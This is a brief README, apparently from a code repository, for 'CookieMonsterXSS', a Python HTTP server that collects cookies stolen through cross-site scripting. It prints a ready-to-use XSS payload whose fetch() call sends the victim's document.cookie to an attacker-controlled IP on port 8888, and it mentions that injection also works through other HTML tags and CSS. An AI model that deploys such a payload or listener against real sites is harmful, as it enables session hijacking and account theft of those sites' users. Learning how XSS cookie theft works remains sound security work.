# CookieMonsterXSS

![Cookie Monster Image Src:Null Byte](https://img.wonderhowto.com/img/87/00/63644955231719/0/write-xss-cookie-stealer-javascript-steal-passwords.1280x600.jpg)

cookieMonster.py is a python http server listening to inbound connections. The server can be used to capture cookies from the web application that is vulnerable to Cross Site Scripting (XSS).

Example XSS payload: <br>
```<script>fetch(`http://<ATTACKER_MACHINE_IP>:8888?data=${document.cookie}`)</script>```


Keep in mind, there are many ways to perform code injection; using the <script> element tag is just one of them. You can also perform XSS injections using HTML tags and CSS.



